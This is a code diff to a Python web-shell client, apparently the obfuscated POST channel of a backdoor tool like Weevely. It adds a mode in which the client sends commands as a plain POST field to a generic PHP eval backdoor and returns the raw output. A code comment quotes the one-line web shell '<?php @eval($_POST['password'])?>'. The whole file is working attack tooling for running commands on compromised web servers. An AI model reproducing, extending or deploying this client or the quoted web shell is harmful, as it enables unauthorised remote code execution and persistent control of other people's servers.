@@ -1,5 +1,6 @@
 from core.loggers import dlog
 from core import config
+from core import sessions
 import re
 import urllib.parse
 import random
@@ -22,6 +23,7 @@ class ObfPost:
         # Generate the 8 char long main key. Is shared with the server and
         # used to check header, footer, and encrypt the payload.
         password = password.encode('utf-8')
+        self.password = password
 
         passwordhash = hashlib.md5(password).hexdigest().lower()
         self.shared_key = passwordhash[:8].encode('utf-8')
@@ -51,35 +53,44 @@ class ObfPost:
 
 
     def send(self, original_payload, additional_handlers = []):
-
-        if isinstance(original_payload, str):
-            original_payload = original_payload.encode('utf-8')
-
-        xorred_payload = utils.strings.sxor(
-                zlib.compress(original_payload),
-                self.shared_key
-                )
-
-        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b'=')
-
-        wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND
-
-        opener = urllib.request.build_opener(*additional_handlers)
-
+        # get user-agent
         additional_ua = ''
         for h in self.additional_headers:
             if h[0].lower() == 'user-agent' and h[1]:
                 additional_ua = h[1]
                 break
 
-        opener.addheaders = [
-            ('User-Agent', (additional_ua if additional_ua else self.agent))
-        ] + self.additional_headers
+        if not sessions.is_customrized:
+            if isinstance(original_payload, str):
+                original_payload = original_payload.encode('utf-8')
 
-        dlog.debug(
-            '[R] %s...' %
-            (wrapped_payload[0:32])
-        )
+            xorred_payload = utils.strings.sxor(
+                    zlib.compress(original_payload),
+                    self.shared_key
+                    )
+
+            obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b'=')
+
+            wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND
+
+            opener = urllib.request.build_opener(*additional_handlers)
+
+            opener.addheaders = [
+                ('User-Agent', (additional_ua if additional_ua else self.agent))
+            ] + self.additional_headers
+
+            dlog.debug(
+                '[R] %s...' %
+                (wrapped_payload[0:32])
+            )
+        else:
+            opener = urllib.request.build_opener()
+
+            opener.addheaders = [
+                ('User-Agent', (additional_ua if additional_ua else self.agent)),
+                ('Content-Type', 'application/x-www-form-urlencoded')
+            ] + self.additional_headers
+            wrapped_payload = urllib.parse.urlencode({self.password: original_payload}).encode()
 
         url = (
             self.url if not config.add_random_param_nocache
@@ -95,6 +106,12 @@ class ObfPost:
 
         if not response:
             return
+
+        # if current test backdoor program is customrized program
+        # like <?php @eval($_POST['password'])?>
+        # return response directly
+        if sessions.is_customrized:
+            return response
 
         # Multiple debug string may have been printed, using findall
         matched_debug = self.re_debug.findall(response)
